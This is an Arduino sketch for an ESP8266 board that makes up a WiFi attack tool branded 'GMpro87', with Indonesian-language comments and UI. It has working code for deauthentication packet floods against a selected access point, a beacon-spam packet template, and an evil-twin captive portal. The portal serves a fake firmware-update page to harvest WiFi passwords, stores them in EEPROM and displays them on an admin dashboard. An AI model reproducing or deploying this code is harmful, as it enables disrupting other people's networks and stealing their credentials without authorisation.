/*
 * WiFiSnare GMpro87 - Final High-Visibility Version
 * Logo: GMpro87 | Dev: 9u5M4n9
 * Features: OLED High-Vis, Web Editor, Hidden SSID Fix, 4 Attack Modes
 */

#include <Arduino.h>
#include <DNSServer.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

extern "C" {
  #include "user_interface.h"
}

// --- HARDWARE CONFIG ---
#define STROBO_PIN 15  // D8
#define LED_PIN 2      // Built-in LED
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);

// --- NETWORK STATE ---
DNSServer dnsServer;
ESP8266WebServer webServer(80);
IPAddress apIP(192, 168, 4, 1);
IPAddress subNetMask(255, 255, 255, 0);

String ssid_ap = "GMpro";
String pass_ap = "Sangkur87";
String correctPassword = "";
String html_jebakan = "<h3 style='color:red'>Security Update</h3><p>Koneksi terputus, masukkan password WiFi untuk update firmware.</p><form method='get' action='/'><input type='password' name='password' placeholder='Password WiFi' required><br><br><input type='submit' value='UPDATE SEKARANG'></form>";

bool hotspot_active = false, deauthing_active = false, mass_deauth = false, beacon_active = false;
unsigned long deauth_pkt_sent = 0, beacon_pkt_sent = 0, now = 0;

typedef struct { String ssid; uint8_t ch; uint8_t bssid[6]; int32_t rssi; } networkDetails;
networkDetails networks[16];
networkDetails selectedNetwork;

// Packet Templates
uint8_t deauthPacket[26] = { 0xC0, 0x00, 0x31, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00 };
uint8_t beaconPacket[109] = { 0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x11, 0x04 };

// --- OLED DISPLAY (High Visibility Style) ---
void updateOLED(String mode, String stat) {
  display.clearDisplay();
  display.setTextColor(WHITE);
  
  // Header Frame
  display.drawRect(0, 0, 128, 18, WHITE);
  display.setTextSize(1);
  display.setCursor(40, 5);
  display.print("GMpro87");

  // Main Mode (Besar & Jelas)
  display.setTextSize(2);
  display.setCursor(0, 25);
  display.print(mode);

  // Status Info
  display.setTextSize(1);
  display.setCursor(0, 52);
  display.print("> " + stat);
  
  display.display();
}

// --- STORAGE ---
void savePass(String data) { 
  for (int i = 0; i < (int)data.length(); ++i) EEPROM.write(i, data[i]); 
  EEPROM.write(data.length(), '\0'); 
  EEPROM.commit(); 
}

String readPass() { 
  char data[150]; 
  for (int i = 0; i < 150; i++) { 
    data[i] = EEPROM.read(i); 
    if (data[i] == '\0') break; 
  }
  return (uint8_t)data[0] == 255 ? "" : String(data); 
}

// --- WIFI ENGINE ---
void performScan() {
  int n = WiFi.scanNetworks(false, true); 
  if (n <= 0) return;
  for (int i = 0; i < min(n, 16); ++i) {
    String s = WiFi.SSID(i);
    networks[i].ssid = (s.length() == 0) ? "<HIDDEN>" : s; 
    memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
    networks[i].ch = WiFi.channel(i);
    networks[i].rssi = WiFi.RSSI(i);
  }
}

String bytesToStr(const uint8_t* b, uint32_t s) {
  String res; for (uint32_t i=0; i<s; ++i) { if(i>0)res+=":"; if(b[i]<0x10)res+="0"; res+=String(b[i],HEX); } return res;
}

// --- WEB ADMIN ---
void handleIndex() {
  // Capture logic
  if (hotspot_active && webServer.hasArg("password")) {
    savePass(webServer.arg("password"));
    webServer.send(200, "text/html", "<html><script>alert('System Busy. Try again later.');window.location='/';</script></html>");
    return;
  }

  // Victim Page
  if (hotspot_active && !webServer.hasArg("admin")) {
    webServer.send(200, "text/html", html_jebakan);
    return;
  }

  // Admin Actions
  if (webServer.hasArg("saveHtml")) html_jebakan = webServer.arg("newHtml");
  if (webServer.hasArg("clear")) { for(int i=0;i<150;i++) EEPROM.write(i,0); EEPROM.commit(); correctPassword = ""; }
  if (webServer.hasArg("ap")) {
    int idx = webServer.arg("ap").toInt();
    selectedNetwork = networks[idx];
  }
  if (webServer.hasArg("deauth")) deauthing_active = (webServer.arg("deauth") == "start");
  if (webServer.hasArg("beacon")) beacon_active = (webServer.arg("beacon") == "start");
  if (webServer.hasArg("hotspot")) {
    hotspot_active = (webServer.arg("hotspot") == "start");
    WiFi.softAPdisconnect(true);
    if(hotspot_active) {
      WiFi.softAPConfig(apIP, apIP, subNetMask);
      WiFi.softAP(selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", apIP);
    } else {
      WiFi.softAP(ssid_ap.c_str(), pass_ap.c_str());
    }
  }

  // Build UI
  correctPassword = readPass();
  String p = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1,maximum-scale=1'><style>";
  p += "body{font-family:Arial;background:#000;color:#fff;margin:0;padding:10px;text-align:center}";
  p += "h2{border:2px solid orange;padding:8px;display:inline-block;border-radius:6px;margin:10px 0;text-transform:uppercase}";
  p += ".tabs{display:flex;margin-bottom:15px;border-bottom:1px solid orange}.tab-btn{flex:1;padding:10px;background:#222;color:#fff;border:none;font-size:12px}.active-tab{background:orange;color:#000;font-weight:bold}";
  p += ".pass-box{background:#050;color:#0f0;border:2px dashed #0f0;padding:12px;margin:10px 0;text-align:left;border-radius:8px}.pass-text{font-size:18px;color:#fff;font-weight:bold;display:block}";
  p += "table{width:100%;border-collapse:collapse;font-size:12px}th,td{padding:10px 5px;border:1px solid #146dcc}th{background:rgba(20,109,204,0.3);color:orange}";
  p += ".btn-sel{background:#eb3489;color:#fff;border:none;padding:6px;border-radius:4px;width:100%}.btn-ok{background:#FFC72C;color:#000;border:none;padding:6px;border-radius:4px;width:100%;font-weight:bold}";
  p += ".ctrl{display:flex;justify-content:space-between;flex-wrap:wrap}.cmd-box{flex:1;margin:2px;min-width:45%;background:#111;padding:5px;border-radius:4px}";
  p += ".cmd{width:100%;padding:12px 0;border:none;border-radius:4px;color:#fff;font-weight:bold;font-size:10px;text-transform:uppercase}";
  p += ".log-c{font-size:9px;margin-top:4px;font-family:monospace;color:#888}.hidden{display:none}.txt-area{width:92%;height:200px;background:#111;color:#0f0;border:1px solid #444;padding:10px}</style></head><body>";
  
  p += "<h2>GMpro87</h2><div class='tabs'><button class='tab-btn active-tab' onclick='openTab(\"dash\", this)'>DASHBOARD</button><button class='tab-btn' onclick='openTab(\"webset\", this)'>WEB SETTINGS</button></div>";
  
  p += "<div id='dash'>";
  if(correctPassword != "") p += "<div class='pass-box'><b>[ CAPTURED PASS ]</b><br>Target: "+selectedNetwork.ssid+"<br>Pass: <span class='pass-text'>"+correctPassword+"</span><a href='/?admin=1&clear=1' style='color:#f44;text-decoration:none;font-size:10px'>[ HAPUS ]</a></div>";
  
  p += "<table><tr><th>SSID</th><th>Ch</th><th>%</th><th>Aksi</th></tr>";
  for(int i=0; i<16 && networks[i].ssid != ""; i++) {
    bool sel = (bytesToStr(networks[i].bssid, 6) == bytesToStr(selectedNetwork.bssid, 6));
    p += "<tr><td>" + networks[i].ssid + "</td><td>" + String(networks[i].ch) + "</td><td>" + String(2*(networks[i].rssi+100)) + "</td>";
    p += "<td><form method='post' action='/?admin=1&ap=" + String(i) + "'><button class='" + String(sel?"btn-ok":"btn-sel") + "'>" + String(sel?"OK":"Sel") + "</button></form></td></tr>";
  }
  p += "</table><hr>";

  p += "<div class='ctrl'>";
  p += "<div class='cmd-box'><form method='post' action='/?admin=1&deauth="+String(deauthing_active?"stop":"start")+"'><button class='cmd' style='background:"+String(deauthing_active?"#f00":"#0c8")+"'>DEAUTH</button></form><div class='log-c'>"+String(deauth_pkt_sent)+" pkt</div></div>";
  p += "<div class='cmd-box'><button class='cmd' style='background:#e60'>RUSUH</button><div class='log-c'>READY</div></div>";
  p += "<div class='cmd-box'><form method='post' action='/?admin=1&beacon="+String(beacon_active?"stop":"start")+"'><button class='cmd' style='background:"+String(beacon_active?"#f00":"#60d")+"'>BEACON</button></form><div class='log-c'>"+String(beacon_pkt_sent)+" pkt</div></div>";
  p += "<div class='cmd-box'><form method='post' action='/?admin=1&hotspot="+String(hotspot_active?"stop":"start")+"'><button class='cmd' style='background:"+String(hotspot_active?"#f00":"#a53")+"'>EVILTWIN</button></form><div class='log-c'>STROBO: OK</div></div>";
  p += "</div></div>";

  p += "<div id='webset' class='hidden'><div style='text-align:left;background:#111;padding:10px;border-radius:5px'><b style='color:orange'>EDIT JEBAKAN HTML:</b><form method='post' action='/?admin=1&saveHtml=1'>";
  p += "<textarea class='txt-area' name='newHtml'>"+html_jebakan+"</textarea><br><button class='btn-ok' style='width:100%;margin-top:10px'>SAVE & UPDATE</button></form></div></div>";

  p += "<script>function openTab(t,b){document.getElementById('dash').classList.add('hidden');document.getElementById('webset').classList.add('hidden');document.querySelectorAll('.tab-btn').forEach(x=>x.classList.remove('active-tab'));document.getElementById(t).classList.remove('hidden');b.classList.add('active-tab');}</script></body></html>";
  
  webServer.send(200, "text/html", p);
}

// --- SETUP & LOOP ---
void setup() {
  EEPROM.begin(512); 
  Wire.begin(4, 5); 
  pinMode(STROBO_PIN, OUTPUT);
  
  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) { }
  display.clearDisplay();
  display.display();

  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(apIP, apIP, subNetMask);
  WiFi.softAP(ssid_ap.c_str(), pass_ap.c_str());
  
  webServer.on("/", handleIndex);
  webServer.onNotFound(handleIndex);
  webServer.begin();
  
  performScan();
  updateOLED("READY", "GMpro87 Active");
}

void loop() {
  webServer.handleClient();
  if(hotspot_active) dnsServer.processNextRequest();

  // Serangan Deauth
  if (deauthing_active && millis() - now >= 500) {
    wifi_set_channel(selectedNetwork.ch);
    memcpy(&deauthPacket[10], selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], selectedNetwork.bssid, 6);
    if(wifi_send_pkt_freedom(deauthPacket, 26, 0) == 0) deauth_pkt_sent++;
    updateOLED("DEAUTH", String(deauth_pkt_sent) + " pkt");
    now = millis();
  }

  // Scan Otomatis tiap 30 detik
  static unsigned long last_scan = 0;
  if (millis() - last_scan > 30000) { performScan(); last_scan = millis(); }
}
